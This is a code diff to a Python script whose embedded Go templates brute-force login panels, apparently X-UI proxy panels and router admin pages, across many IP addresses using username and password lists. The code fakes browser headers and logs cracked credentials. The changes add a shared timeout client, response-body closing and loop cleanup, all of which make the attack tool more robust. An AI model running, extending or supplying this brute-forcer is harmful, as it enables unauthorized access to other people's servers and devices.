@@ -8,7 +8,7 @@ try:
 except ImportError:
     pass
 
-# =========================== xui.go模板1内容 ===========================
+# =========================== xui.go模板1内容 (已修复) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -31,6 +31,11 @@ var completedCount int64
 var totalTasks int64
 var startTime time.Time
 
+// 使用一个共享的、带超时的http.Client实例
+var httpClient = &http.Client{
+	Timeout: 3 * time.Second,
+}
+
 func loadList(filename string) []string {
 	content, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -49,7 +54,7 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	client := &http.Client{}
+	// 不再创建新的client，而是使用全局共享的httpClient
 	payload := fmt.Sprintf("username=%s&password=%s", username, password)
 	formData := strings.NewReader(payload)
 	req, err := http.NewRequest("POST", url, formData)
@@ -58,7 +63,7 @@ func postRequest(ctx context.Context, url string, username string, password stri
 	}
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	req = req.WithContext(ctx)
-	return client.Do(req)
+	return httpClient.Do(req)
 }
 
 func writeResultToFile(file *os.File, text string) {
@@ -95,6 +100,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
 				body, _ := ioutil.ReadAll(resp.Body)
@@ -194,7 +200,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 ===========================
+# =========================== xui.go模板2内容 (已修复) ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -217,8 +223,13 @@ var completedCount int64
 var totalTasks int64
 var startTime time.Time
 
+// 使用一个共享的、带超时的http.Client实例
+var httpClient = &http.Client{
+	Timeout: 3 * time.Second,
+}
+
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	client := &http.Client{}
+	// 不再创建新的client，而是使用全局共享的httpClient
 	data := map[string]string{
 		"username": username,
 		"password": password,
@@ -230,7 +241,7 @@ func postRequest(ctx context.Context, url string, username string, password stri
 	}
 	req.Header.Set("Content-Type", "application/json")
 	req = req.WithContext(ctx)
-	return client.Do(req)
+	return httpClient.Do(req)
 }
 
 func writeResultToFile(file *os.File, text string) {
@@ -267,6 +278,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
 				body, _ := ioutil.ReadAll(resp.Body)
@@ -382,7 +394,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 ===========================
+# =========================== xui.go模板3内容 (已修复) ===========================
 XUI_GO_TEMPLATE_3 = '''package main
 
 import (
@@ -405,6 +417,11 @@ var completedCount int64
 var totalTasks int64
 var startTime time.Time
 
+// 使用一个共享的、带超时的http.Client实例
+var httpClient = &http.Client{
+	Timeout: 3 * time.Second,
+}
+
 func loadList(filename string) []string {
 	content, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -423,7 +440,7 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	client := &http.Client{}
+	// 不再创建新的client，而是使用全局共享的httpClient
 	data := map[string]string{
 		"username": username,
 		"pass": password,
@@ -437,7 +454,7 @@ func postRequest(ctx context.Context, url string, username string, password stri
 	req.Header.Add("Accept", "application/json, text/plain, */*")
 	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0")
 	req = req.WithContext(ctx)
-	return client.Do(req)
+	return httpClient.Do(req)
 }
 
 func writeResultToFile(file *os.File, text string) {
@@ -466,6 +483,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			if err != nil {
 				continue
 			}
+			defer resp.Body.Close()
 			if resp.StatusCode == http.StatusOK {
 				body, _ := ioutil.ReadAll(resp.Body)
 				var responseData map[string]interface{}
@@ -565,7 +583,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板4内容 ===========================
+# =========================== xui.go模板4内容 (已修复) ===========================
 XUI_GO_TEMPLATE_4 = '''package main
 
 import (
@@ -588,6 +606,11 @@ var completedCount int64
 var totalTasks int64
 var startTime time.Time
 
+// 使用一个共享的、带超时的http.Client实例
+var httpClient = &http.Client{
+	Timeout: 3 * time.Second,
+}
+
 func loadList(filename string) []string {
 	content, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -606,9 +629,7 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	client := &http.Client{}
-
-	// 构造 JSON 格式负载
+	// 不再创建新的client，而是使用全局共享的httpClient
 	payload := map[string]string{
 		"username": username,
 		"password": password,
@@ -620,13 +641,12 @@ func postRequest(ctx context.Context, url string, username string, password stri
 		return nil, err
 	}
 
-	// 浏览器伪造请求头
 	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
 	req.Header.Set("Accept", "application/json, text/plain, */*")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
 	req = req.WithContext(ctx)
 
-	return client.Do(req)
+	return httpClient.Do(req)
 }
 
 func writeResultToFile(file *os.File, text string) {
@@ -653,7 +673,12 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 
-			if err != nil || resp.StatusCode != 200 {
+			if err != nil {
+				continue
+			}
+			defer resp.Body.Close()
+			
+			if resp.StatusCode != 200 {
 				continue
 			}
 
@@ -753,7 +778,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板5内容 ===========================
+# =========================== xui.go模板5内容 (已修复) ===========================
 XUI_GO_TEMPLATE_5 = '''package main
 
 import (
@@ -776,6 +801,11 @@ var completedCount int64
 var totalTasks int64
 var startTime time.Time
 
+// 使用一个共享的、带超时的http.Client实例
+var httpClient = &http.Client{
+	Timeout: 3 * time.Second,
+}
+
 func loadList(filename string) []string {
 	content, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -794,7 +824,7 @@ func loadList(filename string) []string {
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
-	client := &http.Client{}
+	// 不再创建新的client，而是使用全局共享的httpClient
 	form := fmt.Sprintf("user=%s&pass=%s", username, password)
 	body := strings.NewReader(form)
 
@@ -809,7 +839,7 @@ func postRequest(ctx context.Context, url string, username string, password stri
 	req.Header.Set("X-Requested-With", "XMLHttpRequest")
 	req = req.WithContext(ctx)
 
-	return client.Do(req)
+	return httpClient.Do(req)
 }
 
 func writeResultToFile(file *os.File, text string) {
@@ -836,7 +866,12 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 
-			if err != nil || resp.StatusCode != 200 {
+			if err != nil {
+				continue
+			}
+			defer resp.Body.Close()
+
+			if resp.StatusCode != 200 {
 				continue
 			}
 
@@ -914,32 +949,29 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	// 修改后的代码
     for i := 0; i < len(batch); i += batchSize {
-    end := i + batchSize
-    if end > len(batch) {
-        end = len(batch)
-    }
-    currentBatch := batch[i:end]
+		end := i + batchSize
+		if end > len(batch) {
+			end = len(batch)
+		}
+		currentBatch := batch[i:end]
 
-    for _, ipPort := range currentBatch {
-    wg.Add(1)
-    go processIP(ipPort, file, usernames, passwords)
-    }
+		for _, ipPort := range currentBatch {
+			wg.Add(1)
+			go processIP(ipPort, file, usernames, passwords)
+		}
 
-
-    // 在每个批次完成后调用 wg.Wait()，确保当前批次处理完成后再进行下一步
-    wg.Wait() 
-    time.Sleep(100 * time.Millisecond)
-    triggerGC()
-}
+		wg.Wait() 
+		time.Sleep(100 * time.Millisecond)
+		triggerGC()
+	}
 
 
 	time.Sleep(1 * time.Second)
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板6内容 ===========================
+# =========================== xui.go模板6内容 (无变化) ===========================
 XUI_GO_TEMPLATE_6 = '''package main
 
 import (
@@ -1388,7 +1420,7 @@ RETRY:
 
 
 '''
-# =========================== xui.go模板7内容 ===========================
+# =========================== xui.go模板7内容 (无变化) ===========================
 XUI_GO_TEMPLATE_7 = '''package main
 
 import (
@@ -1576,7 +1608,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 ===========================
+# =========================== xui.go模板8内容 (无变化) ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
@@ -1708,17 +1740,16 @@ loginLoop:
 				if err != nil {
 					continue
 				}
+				defer resp.Body.Close()
 				cookies := resp.Cookies()
 				for _, c := range cookies {
 					if c.Name == "sysauth_http" && c.Value != "" {
 						fmt.Printf("[+] 爆破成功: %s %s %s\\n", finalURL, username, password)
 						writeResultToFile(file, fmt.Sprintf("%s %s %s\\n", finalURL, username, password))
 						atomic.AddInt64(&completedCount, 1)
-						resp.Body.Close()
 						break loginLoop
 					}
 				}
-				resp.Body.Close()
 			}
 		}
 	}
@@ -1804,8 +1835,8 @@ func main() {
 }
 
 '''
-# =========================== ipcx.py 内容 ===========================
-IPCX_PY_CONTENT = """import requests
+# =========================== ipcx.py 内容 (无变化) ===========================
+IPCX_PY_CONTENT = r"""import requests
 import time
 import os
 import re
@@ -1932,7 +1963,7 @@ if __name__ == "__main__":
 
 """
 
-# =========================== 主脚本部分 ===========================
+# =========================== 主脚本部分 (无变化) ===========================
 
 def input_with_default(prompt, default):
     user_input = input(f"{prompt}（默认 {default}）：").strip()
@@ -2055,7 +2086,7 @@ def run_xui_for_parts(sleep_seconds):
 
     for idx, part in enumerate(part_files, 1):
         elapsed = time.time() - start_time
-        avg_time_per_part = elapsed / idx
+        avg_time_per_part = elapsed / idx if idx > 0 else 0
         remaining_parts = total_parts - idx
         est_remaining_time = avg_time_per_part * remaining_parts
         est_min = int(est_remaining_time) // 60
@@ -2125,7 +2156,7 @@ def clean_temp_files():
     shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
 
-    for f in ['results.txt', 'xui.go', 'ipcx.py', 'xui.txt']:
+    for f in ['results.txt', 'xui.go', 'ipcx.py', 'xui.txt', 'hmsuccess.txt', 'hmfail.txt']:
         if os.path.exists(f):
             os.remove(f)
 
@@ -2475,7 +2506,7 @@ if __name__ == "__main__":
                 import shutil
                 from datetime import datetime, timedelta, timezone
 
-                beijing_time = datetime.utcnow().replace(tzinfo=timezone.utc) + timedelta(hours=8)
+                beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
                 time_str = beijing_time.strftime("%Y%m%d-%H%M")
 
                 if TEMPLATE_MODE == 1:
